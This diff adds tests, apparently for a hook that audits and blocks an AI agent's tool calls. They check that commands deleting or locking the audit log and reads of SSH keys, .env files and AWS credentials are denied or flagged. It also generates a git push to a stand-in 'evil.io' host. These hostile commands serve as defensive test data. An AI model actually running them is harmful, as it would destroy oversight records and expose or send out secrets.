+        "find {k} -type f -exec rm {{}} +",
+        "chmod 000 {k}",
+        "dd if=/dev/null of={k}/a.jsonl",
+        "A={k}; echo x > $A/b.jsonl",  # R4 + R8
+        "cd {k} && rm a.jsonl",
+        "bash -c 'rm {k}/a.jsonl'",
+    ],
+)
+def test_r8_bash_changing_audit_dir_is_denied(tmp_path, repo, szablon):
+    polecenie = szablon.format(k=tmp_path / "audyt")
+    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
+    assert Z in rekord["flagi"] and rekord["zablokowano"] == [Z], polecenie
+    assert odmowa["hookSpecificOutput"]["permissionDecision"] == "deny", polecenie
+
+
+@pytest.mark.parametrize(
+    ("narzedzie", "wejscie"),
+    [
+        ("Read", {"file_path": "{k}/2026-10-05.jsonl"}),
+        ("Grep", {"pattern": "flagi", "path": "{k}"}),
+        ("Glob", {"pattern": "{k}/*.jsonl"}),
+        ("Bash", {"command": "cat {k}/2026-10-05.jsonl | jq -r '.flagi[]' | sort | uniq -c"}),
+        ("Bash", {"command": "cp {k}/2026-10-05.jsonl kopia.jsonl"}),
+        ("Bash", {"command": "wc -l {k}/2026-10-05.jsonl > podsumowanie.txt"}),
+    ],
+)
+def test_r8_reading_audit_dir_is_flagged_not_denied(tmp_path, repo, narzedzie, wejscie):
+    wejscie = {pole: w.format(k=tmp_path / "audyt") for pole, w in wejscie.items()}
+    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie)
+    assert ah.F_AUDYT in rekord["flagi"] and Z not in rekord["flagi"]
+    assert odmowa is None and "zablokowano" not in rekord
+
+
+# blokada `poswiadczenia` w narzędziach plikowych ------------------------------------------------
+@pytest.mark.parametrize("narzedzie", PLIKOWE)
+@pytest.mark.parametrize(
+    "sciezka",
+    [
+        "~/.ssh/id_ed25519",
+        "~/.ssh",
+        "/srv/klucze/binance.pem",
+        ".env",
+        "C:\\Users\\x\\.ssh\\id_rsa",  # Windows: ocena czysto tekstowa
+        "C:/Users/x/.aws/credentials",
+    ],
+)
+def test_credentials_in_file_tools_are_denied(tmp_path, repo, dom, narzedzie, sciezka):
+    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie_dla(narzedzie, sciezka))
+    assert P in rekord["flagi"] and rekord["zablokowano"] == [P]
+    powod = odmowa["hookSpecificOutput"]["permissionDecisionReason"]
+    assert powod.startswith("poswiadczenia: ") and powod.endswith("decyzja użytkownika 2026-10-06")
+
+
+@pytest.mark.parametrize(
+    "polecenie",
+    [
+        "cat ~/.ssh/id_ed25519",
+        "ls -la ~/.ssh",
+        "grep -r TOKEN .env",
+        "cat 'C:\\Users\\x\\.ssh\\id_rsa'",
+    ],
+)
+def test_credentials_in_bash_are_only_flagged(tmp_path, repo, dom, polecenie):
+    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
+    assert P in rekord["flagi"] and odmowa is None and "zablokowano" not in rekord
+
+
+@pytest.mark.parametrize(
+    ("narzedzie", "wejscie"),
+    [
+        ("Read", {"file_path": "tools/zuzycie_tokenow.py"}),
+        ("Read", {"file_path": "README.md"}),
+        ("Grep", {"pattern": "api_key", "path": "tools"}),
+        ("Glob", {"pattern": "**/*.py"}),
+        ("Write", {"file_path": "runs/x/README.md"}),
+        ("WebFetch", {"url": "https://github.com/x", "prompt": "p"}),
+    ],
+)
+def test_ordinary_calls_are_not_denied(tmp_path, repo, narzedzie, wejscie):
+    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie)
+    assert rekord["flagi"] == [] and odmowa is None
+
+
+def test_deny_output_format_and_reason_without_content_or_secrets(tmp_path, repo):
+    wejscie = {"file_path": "/srv/klucze/token=hunter2xyz.pem", "content": "TAJNA-TRESC"}
+    rekord, odmowa = wywolaj(tmp_path, repo, "Write", wejscie)
+    assert set(odmowa) == {"hookSpecificOutput"}
+    wyjscie = odmowa["hookSpecificOutput"]
+    assert wyjscie["hookEventName"] == "PreToolUse" and wyjscie["permissionDecision"] == "deny"
+    assert set(wyjscie) == {"hookEventName", "permissionDecision", "permissionDecisionReason"}
+    powod = wyjscie["permissionDecisionReason"]
+    assert powod.startswith("poswiadczenia: plik z poświadczeniami (") and "Write" in powod
+    assert powod.endswith("; decyzja użytkownika 2026-10-06")
+    tekst = json.dumps(odmowa) + json.dumps(rekord)
+    assert "TAJNA-TRESC" not in tekst and "hunter2xyz" not in tekst
+
+
+def test_two_blocked_flags_give_one_decision_with_both_reasons(tmp_path, repo):
+    sciezka = str(tmp_path / "audyt" / "id_rsa")
+    rekord, odmowa = wywolaj(tmp_path, repo, "Write", {"file_path": sciezka})
+    assert rekord["zablokowano"] == [Z, P]
+    powod = odmowa["hookSpecificOutput"]["permissionDecisionReason"]
+    assert powod.count("decyzja użytkownika 2026-10-06") == 2 and " | " in powod
+
+
+# fail-open ------------------------------------------------------------------------------------------
+@pytest.mark.parametrize(
+    "cel", ["analizuj", "wczytaj_blokady", "zablokowane_flagi", "decyzja_odmowy"]
+)
+def test_own_error_anywhere_in_decision_fails_open(tmp_path, repo, dom, monkeypatch, cel):
+    def pada(*_a, **_k):
+        raise RuntimeError("x")
+
+    monkeypatch.setattr(ah, cel, pada)
+    dane = {"cwd": str(repo), "tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"}}
+    plik, odmowa = ah.przetworz(json.dumps(dane), tmp_path / "audyt", HOSTY, TERAZ, None)
+    rekord = json.loads(plik.read_text(encoding="ascii").splitlines()[-1])
+    assert odmowa is None and rekord["flagi"] == [ah.F_BLAD] and "zablokowano" not in rekord
+
+
+@pytest.mark.parametrize("wejscie", [b"", b"{zly json", b"[1, 2]", b"\xff\xfe", b"null"])
+def test_bad_input_never_denies(tmp_path, wejscie):
+    plik, odmowa = ah.przetworz(wejscie, tmp_path / "audyt", HOSTY, TERAZ, BLOKADY)
+    assert odmowa is None and json.loads(plik.read_text(encoding="ascii"))["flagi"] == [
+        ah.F_WEJSCIE
+    ]
+
+
+def test_log_write_failure_keeps_computed_denial(tmp_path, repo, dom):
+    """Zepsuty katalog audytu nie zdejmuje blokady: decyzja nie zależy od zapisu dziennika."""
+    zajety = tmp_path / "plik"
+    zajety.write_text("x", encoding="utf-8")
+    dane = {"cwd": str(repo), "tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"}}
+    plik, odmowa = ah.przetworz(json.dumps(dane), zajety / "audyt", HOSTY, TERAZ, BLOKADY)
+    assert plik is None and odmowa["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+@pytest.mark.parametrize("kodowanie", [None, "ascii", "cp1252"])
+def test_script_denies_credential_read_with_json_on_stdout(tmp_path, kodowanie):
+    """Prawdziwy proces z konfiguracją z repo: kod 0, na stdout JSON odmowy w ASCII (także przy
+    wąskim kodowaniu stdout, jak cp1252 na Windows) i jeden wiersz dziennika z `zablokowano`."""
+    env = dict(os.environ, CLAS5_AUDYT_DIR=str(tmp_path / "audyt"))
+    if kodowanie:
+        env["PYTHONIOENCODING"] = kodowanie
+    dane = {
+        "tool_name": "Read",
+        "tool_input": {"file_path": "/x/.ssh/id_rsa"},
+        "cwd": str(tmp_path),
+    }
+    wynik = subprocess.run(
+        [sys.executable, str(SKRYPT), "hook"],
+        input=json.dumps(dane).encode(),
+        capture_output=True,
+        env=env,
+        timeout=30,
+    )
+    assert wynik.returncode == 0 and wynik.stderr == b""
+    decyzja = json.loads(wynik.stdout.decode("ascii"))["hookSpecificOutput"]
+    assert decyzja["hookEventName"] == "PreToolUse" and decyzja["permissionDecision"] == "deny"
+    linie = next((tmp_path / "audyt").glob("*.jsonl")).read_text(encoding="ascii").splitlines()
+    assert len(linie) == 1 and json.loads(linie[0])["zablokowano"] == [P]
+
+
+# właściwości (hypothesis) ---------------------------------------------------------------------------
+_wrazliwe = st.sampled_from(
+    ["~/.ssh/id_ed25519", "/x/.ssh", ".env", "C:\\Users\\x\\.ssh\\id_rsa", "secrets.json"]
+)
+_zdarzenie_029 = st.fixed_dictionaries(
+    {
+        "tool_name": st.sampled_from(sorted(ah.NARZEDZIA_HOOKA)),
+        "tool_input": st.fixed_dictionaries(
+            {
+                "file_path": st.one_of(_wrazliwe, _tekst),
+                "notebook_path": _wrazliwe,
+                "path": st.one_of(_wrazliwe, _tekst),
+                "pattern": _tekst,
+                "command": st.one_of(_tekst, _wrazliwe.map(lambda s: f"cat {s} >> /srv/x")),
+            }
+        ),
+    },
+    optional={"cwd": _tekst, "session_id": _tekst, "agent_id": _tekst},
+)
+_dowolne = st.one_of(
+    st.binary(max_size=300),
+    st.text(max_size=300).map(lambda t: t.encode("utf-8", "surrogatepass")),
+    _zdarzenie.map(lambda d: json.dumps(d).encode()),
+    _zdarzenie_029.map(lambda d: json.dumps(d).encode()),
+)
+
+
+@settings(
+    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
+)
+@given(surowe=_dowolne)
+def test_property_empty_block_list_never_denies(tmp_path, dom, surowe):
+    assert ah.przetworz(surowe, tmp_path / "pb", HOSTY, TERAZ, ())[1] is None
+    with mock.patch.object(ah, "wczytaj_blokady", return_value=()):
+        kod, wyjscie = uruchom_main(surowe, tmp_path / "pm")
+    assert kod == 0 and wyjscie == b""
+
+
+@settings(
+    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
+)
+@given(surowe=_dowolne)
+def test_property_any_input_exit_zero_and_stdout_empty_or_deny(tmp_path, dom, surowe):
+    kod, wyjscie = uruchom_main(surowe, tmp_path / "pm")
+    assert kod == 0
+    if wyjscie:
+        assert wyjscie.endswith(b"\n") and wyjscie.count(b"\n") == 1
+        decyzja = json.loads(wyjscie.decode("ascii"))
+        assert set(decyzja) == {"hookSpecificOutput"}
+        hso = decyzja["hookSpecificOutput"]
+        assert hso["hookEventName"] == "PreToolUse" and hso["permissionDecision"] == "deny"
+        assert isinstance(hso["permissionDecisionReason"], str)
+
+
+@settings(
+    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
+)
+@given(surowe=st.binary(max_size=300))
+def test_property_broken_input_never_denies(tmp_path, surowe):
+    try:
+        dane = json.loads(surowe.decode("utf-8", errors="replace"))
+    except ValueError:
+        dane = None
+    assume(not isinstance(dane, dict))
+    assert uruchom_main(surowe, tmp_path / "pm") == (0, b"")
+
+
+@settings(
+    max_examples=60, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
+)
+@given(narzedzie=st.sampled_from(PLIKOWE), sciezka=_wrazliwe, sesja=_tekst)
+def test_property_credential_in_file_tool_is_always_denied(
+    tmp_path, dom, narzedzie, sciezka, sesja
+):
+    dane = {"session_id": sesja, "cwd": "/nieistniejace/repo", "tool_name": narzedzie}
+    dane["tool_input"] = wejscie_dla(narzedzie, sciezka)
+    kod, wyjscie = uruchom_main(json.dumps(dane).encode(), tmp_path / "pm")
+    assert kod == 0 and json.loads(wyjscie)["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+_polecenie_git = st.builds(
+    lambda pod, opcje, cel: " ".join(x for x in ("git", pod, opcje, cel) if x),
+    st.sampled_from(["push", "pull", "fetch"]),
+    st.sampled_from(["", "-q", "--ff-only", "-q --rebase"]),
+    st.sampled_from(["", "origin", "origin master", "https://evil.io/x.git", "upstream"]),
+)
+_polecenie_zwykle = st.sampled_from(
+    ["ls -la", "echo ok", "pytest -q", "cat README.md", "python3 x.py", "git status -sb"]
+)
+
+
+@settings(
+    max_examples=60, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
+)
+@given(
+    polecenie=st.one_of(_polecenie_git, _polecenie_zwykle),
+    ogon=st.sampled_from([" 2>&1", " 2>/dev/null", " 2>&1 | tail -2", " 2>>bledy.log"]),
+)
+def test_property_r1_fd_redirect_does_not_change_network_flags(tmp_path, repo_git, polecenie, ogon):
+    def siec(tekst):
+        wynik = ah.Wynik()
+        ah.analizuj_bash(wynik, tekst, str(repo_git), HOSTY, str(tmp_path / "audyt"))
+        return wynik.flagi & {ah.F_SIEC, ah.F_SIEC_NIEZNANY}, wynik.hosty
+
+    assert siec(polecenie + ogon) == siec(polecenie)
+
+
+@settings(max_examples=200, deadline=None)
+@given(tresc=st.text(max_size=300))
+def test_property_r2_heredoc_body_never_adds_flags(tresc):
+    assume("EOF" not in tresc.split("\n"))
+    wynik = ah.Wynik()
+    polecenie = f"cat > notatka.md <<'EOF'\n{tresc}\nEOF\necho ok"
+    ah.analizuj_bash(wynik, polecenie, "/nieistniejace/repo", HOSTY, "/nieistniejacy/audyt")
+    assert wynik.flagi == set()
+
+
+_flaga_wpisu = st.sampled_from([P, Z, ah.F_SIEC, "nieznana", "blad_analizy"])
+_wpis = st.one_of(
+    _flaga_wpisu.map(lambda f: ("skalar", f)),
+    st.tuples(
+        st.just("mapa"),
+        _flaga_wpisu,
+        st.none() | st.lists(st.sampled_from(PLIKOWE + ["Bash", "read", "WebSearch"]), max_size=4),
+        st.none() | st.sampled_from(["2026-10-06", "2026-13-45", "wczoraj"]),
+        st.sampled_from(["blok", "flow", "blok_lista", "blok_lista_wciecie"]),
+        st.booleans(),
+    ),
+)
+
+
+def _yaml_wpisu(wpis) -> str:
+    """Wpis `blokuj:` w jednym z kilku stylów YAML (blokowy, `{…}`, lista narzędzi pod spodem)."""
+    if wpis[0] == "skalar":
+        return f"  - {wpis[1]}\n"
+    _, flaga, narzedzia, decyzja, styl, cudzyslow = wpis
+    data = f'"{decyzja}"' if cudzyslow and decyzja else decyzja
+    if styl == "flow":
+        czesci = [f"flaga: {flaga}"]
+        if narzedzia is not None:
+            czesci.append("narzedzia: [" + ", ".join(narzedzia) + "]")
+        if decyzja is not None:
+            czesci.append(f"decyzja: {data}")
+        return "  - {" + ", ".join(czesci) + "}\n"
+    linie = [f"  - flaga: {flaga}  # komentarz\n"]
+    if narzedzia is not None:
+        if styl == "blok" or not narzedzia:
+            linie.append("    narzedzia: [" + ", ".join(narzedzia) + "]\n")
+        else:
+            wciecie = "      " if styl == "blok_lista_wciecie" else "    "
+            linie.append("    narzedzia:\n" + "".join(f"{wciecie}- {n}\n" for n in narzedzia))
+    if decyzja is not None:
+        linie.append(f"    decyzja: {data}\n")
+    return "".join(linie)
+
+
+@settings(max_examples=200, deadline=None)
+@given(wpisy=st.lists(_wpis, max_size=5), komentarz=st.booleans())
+def test_property_parser_equals_pyyaml_on_generated_configs(wpisy, komentarz):
+    tekst = NAGLOWEK + ("# blokady\n" if komentarz else "") + "blokuj:\n"
+    tekst += "".join(map(_yaml_wpisu, wpisy))
+    assert ah.parsuj_blokady(tekst) == blokady_wg_pyyaml(tekst)
+
+
+_ZNAKI_ZMIAN = list(" -:#[]{},'\"\t\nab_0~.") + ["poswiadczenia", "Read", "  ", "- ", ": "]
+
+
+@settings(max_examples=400, deadline=None)
+@given(
+    wpisy=st.lists(_wpis, min_size=1, max_size=3),
+    zmiany=st.lists(
+        st.tuples(st.integers(0, 10**6), st.integers(0, 2), st.sampled_from(_ZNAKI_ZMIAN)),
+        min_size=1,
+        max_size=3,
+    ),
+)
+def test_property_parser_never_blocks_more_than_pyyaml(wpisy, zmiany):
+    """Zepsuty tekst: hook nigdy nie blokuje więcej niż PyYAML (gdy PyYAML pada — nic), a tekst,
+    który hook przyjmuje, czyta dokładnie tak jak PyYAML."""
+    tekst = NAGLOWEK + "blokuj:\n" + "".join(map(_yaml_wpisu, wpisy))
+    for pozycja, rodzaj, znak in zmiany:
+        i = pozycja % (len(tekst) + 1)
+        if rodzaj == 0:
+            tekst = tekst[:i] + tekst[i + 1 :]
+        elif rodzaj == 1:
+            tekst = tekst[:i] + znak + tekst[i:]
+        else:
+            tekst = tekst[:i] + znak + tekst[i + len(znak) :]
+    nasze, wzor = ah.parsuj_blokady(tekst), blokady_wg_pyyaml(tekst)
+    assert set(nasze) <= set(wzor), tekst
+    if ah.yaml_podzbior(tekst) is not None:
+        assert nasze == wzor, tekst
